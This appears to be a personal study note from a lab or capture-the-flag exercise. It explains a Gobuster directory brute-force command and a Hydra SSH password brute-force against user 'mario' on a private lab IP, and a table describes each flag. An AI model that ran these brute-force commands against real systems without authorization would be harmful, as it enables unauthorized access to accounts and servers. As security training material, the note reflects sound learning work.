## Gobuster 
**Gobuster** is a **fast directory and file brute-forcing tool** written in Go. It's mainly used for:
- **Finding hidden directories & files** on web servers (`dir` mode).
- **Brute-forcing subdomains** (`dns` mode).
- **Brute-forcing S3 buckets, virtual hosts, and more**.

Searches for hidden directories and files.
``` bash
sudo gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u "http://172.18.0.2/" -x .php,.sh,.py,.txt
```

| gobuster dir                | Uses the **directory brute-forcing mode** (searches for hidden directories and files). |
| --------------------------- | -------------------------------------------------------------------------------------- |
| -w /usr/share/wordlists/... | Specifies the **wordlist** for brute-forcing (from SecLists).                          |
| -u "http://172.18.0.2/"     | Sets the **target URL** to scan.                                                       |
| -x .php,.sh,.py,.txt        | Appends **file extensions** to test for specific file types.                           |
![[Pasted image 20250329042633.png]]


## Hydra
Hydra is a password-cracking tool that uses brutal-force with word lists.

This command **performs a brute-force attack** on the **SSH service** using the **Hydra** tool.
``` bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
```

| -l mario                            | Sets the **username** to `mario` (attempts to log in as this user).           |
| ----------------------------------- | ----------------------------------------------------------------------------- |
| -P /usr/share/wordlists/rockyou.txt | Uses the **RockYou wordlist** as the password list (brute-forcing passwords). |
| ssh://172.18.0.2                    | Specifies **SSH as the target service** and `172.18.0.2` as the target IP.    |
![[Pasted image 20250329043510.png]]